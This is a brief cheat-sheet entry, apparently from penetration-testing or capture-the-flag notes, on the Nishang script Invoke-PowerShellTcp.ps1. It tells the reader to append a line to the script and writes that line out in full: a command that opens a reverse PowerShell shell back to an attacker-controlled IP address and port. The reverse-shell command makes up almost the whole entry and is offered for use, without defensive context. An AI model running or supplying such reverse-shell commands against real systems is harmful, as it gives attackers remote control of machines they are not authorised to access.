# nishang

## Invoke-PowershellTCP.ps1

Add the line below at the end of the script. Specify the IP address of attacking machine and the port you want to reveived your reverse shell back. 

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
```
​